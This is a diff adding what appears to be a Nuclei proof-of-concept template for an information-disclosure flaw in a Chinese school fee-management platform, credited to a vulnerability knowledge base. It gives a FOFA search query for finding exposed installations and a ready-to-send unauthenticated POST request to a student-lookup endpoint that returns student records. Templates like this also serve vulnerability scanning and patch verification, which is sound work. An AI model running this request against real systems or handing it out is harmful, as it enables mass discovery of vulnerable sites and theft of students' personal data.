@@ -1,0 +1,36 @@
+id: poc-srwayvcntq2swz79
+info:
+  name: 博友科技-校盈家财务收费管理平台 getstudent 信息泄露
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/srwayvcntq2swz79'
+  tags: info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: srwayvcntq2swz79
+    fofa: body="/Content/index1.css" && body="财务收费管理"
+http:
+- raw:
+  - 'POST /RecruitStudent/GetStudent HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
+
+    Connection: close
+
+    Content-Length: 7
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    X-Requested-With: XMLHttpRequest
+
+    Accept-Encoding: gzip, deflate, br
+
+
+    ID=6628'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
